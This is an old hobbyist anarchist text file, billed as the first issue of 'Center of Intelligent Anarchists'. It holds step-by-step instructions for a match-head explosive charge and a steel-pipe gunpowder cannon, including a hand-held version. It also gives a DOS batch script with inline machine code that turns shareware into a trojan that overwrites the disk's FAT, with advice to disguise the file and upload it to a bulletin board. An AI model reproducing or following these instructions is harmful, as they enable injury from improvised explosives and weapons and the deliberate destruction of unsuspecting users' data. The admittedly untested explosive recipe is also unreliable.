        Welcome to the first issue of the Center of Intelligent Anarchists.

we are Center of Intelligent Anarchists because we are intelligent enough not
to get caught (we haven't yet).  And we are hoping to educate you so that you
don't either!!

Match Head Charge>>>>>>>>>>>>
<><><><><><><><><>
        A simple high power charge can be made from a large quantity of
saftey matches, a firecracker or other detonator, a paper bag, and some
masking tape.
        First you carefully scrape off all of the powder from about 1000
matches.  More of less depending upoun the size of your charge.  Next you
must make the temporary container.  Do this by making a cylinder roughly
one inch in diameter and two or three inches long.  The powder is then
crushed to a fine powder in a bowl and a small amount of water is added to 
make a clay type substance.  Pour and pack this into your temporary casing.
Push a stick the same size as your detonator two thirds of the way into the
charge.  This aids drying and also makes a hole for the detonator.  After an
hour or so remove the stick.  Let dry for a few more hours and then peel off
the paper bag.  Put in a warm dry place for a few more days for it to
completely dry.  When it is dryed a small amount of black powder is poured
into the hole and then the detonator is inserted and lit or electrically 
ignited.  Then boom!!  This can also be lit with a match which will produce 
a fast burning flame.  Using your imagination you could use it for many 
things, such as a propellant.  In which case it would not be detonated, but
the small amount of black powder would be needed to ensure ignition.  This
has not been tested.  I'll keep you posted when I finally test it.

Gunpowder Cannon, 1" Calliber>>>>>>>>>>>
<><><><><><><><><><><><><><><>
        A simple cannon can be made with the following parts:

        Steel Pipe, 1" in diameter 10" long
        Cap to fit pipe
        Coupling and elbow section to fit pipe (Only Required for Handle)
        Drill and bits

        The construction of this device is quite simple.  If you do not
want a hand held cannon then you merely drill a small hole (so a firecracker 
fuse will just barely fit through) in the end cap.  Then the cap is threaded 
on the end of the pipe.  The fuse of a firecracker is pushed through the hole
in the cap, the firecracker should be on the inside of the pipe.  A wad of 2
tissues is ramed one inch into the pipe.  Gunpowder is poured into the end
with the tissues, and the cap is threaded on pushing the firecracker into
the powder.  Then bb's or a ball bearing or another projectile is placed into
the cannon on top of the tissues and a wad of 1/2 of a tissue is rammed in
the pipe resting on top of the projectile.  Then the cannon must me supported
on the back so that it will not fly back when the cannon goes off.  The fuse
must not touch the ground though.  A stick or log is used to prop the tube
up to the desired angle and the fuse is lit.  It is not wise to stand
directly behind the cannon as your support may not be strong enough.  The 
boom of the cannon is quite loud and the projectile will be fired out the end
of the tube.  The muzzle velocity and range is determined by the weight of
the projectile.
        If you are interested in a hand held cannon, the size and weight of
the projectile must be smaller and the amount of powder must be reduced
because the kick of a full load would either knock you on your ass or you
couldn't hold on to it and it would fly into your stomach.  The construction
differs slightly.  First the end cap is drilled as normal and threaded on to
the end of the 90 degree elbow, the coupling is threaded onto the other end
of the elbow.  The coupling is then srewed onto the main pipe.  The fuse and
firecracker is done the same.  Then the powder is poured into the elbow. 
Don't use to much powder.  The wad of 2 tissues is rammed into the main pipe
flush with the threaded end.  Then it is srewed onto the elbow.  The
projectile is placed in the tube and covered with another wad.  Then the 
fuse is lit by someone not holding the weapon.  Hold on tight and in a second
or so, BOOM!!

Trojan Horse Programs>>>>>>
<><><><><><><><><><><>
        A trojan horse program is a program that hides out in valid code.  It
can be totally self contained though.  If inserted in a valid program it will
write over the beginning of the code usually.  When ran it does something
other than what the program was supposed to do.  Like erasing FAT tables, 
formatting hard disks, etc.
        A simple trojan horse can be created as follows:

        Step #1 - Make a batch file with the following commands:

                @echo off
                cls
                echo e cs:0100 b4 19 cd 21 09 00 33 d2 cd 26 > ~~temp.~tp
                echo w >> ~~temp.~tp
                echo q >> ~~temp.~tp
                debug %1 < ~~temp.~tp > nul
                erase ~~temp.~tp

        Step #2 - Then copy a .com file into the same directory.  It should
        be part of some shareware thing that the sysop would like.  With docs
        and all...  wouldn't want to look suspicious.

        Step #3 - Run the following command line from the dos prompt with
        the current directory being the one with the sharewar to be infected:

                INJECT ".com file to be infected"

        Step #4 - Zip it up (or ark, pak, lharc, zoo, etc)

        Step #5 - Upload it!!

        This program will add five lines of assembly language to the
beginning of the .com file.  It will basically tell it to erase the FAT.
If ran on a hard drive this could be devastating.  
        The following is a listing of the inserted code:
                0100 B419       MOV AH,19       'Get default drive
                0102 CD21       INT 21          'Call to dos
                0104 B90900     MOV CX,0009     'Write 9 sectors
                0107 33D2       XOR DX,DX       'Starting as sector 0
                0109 CD26       INT 26          'Absolute disk write
        Running a mirror program on a regular basis makes it much easier to
recover from the above type program.

Center of Intelligent Anarchists takes no responsibility
in anything you do.  In other words if you kill yourself 
making a cannon, we aren't responsible.  The stuff here is
real and will work.  So be carefull.  I am not encouraging
you to break any laws.  There all said and done.

If you or anyone you know may be interested in writing for us write me
with a list of you skills and what you could write about and how I can in
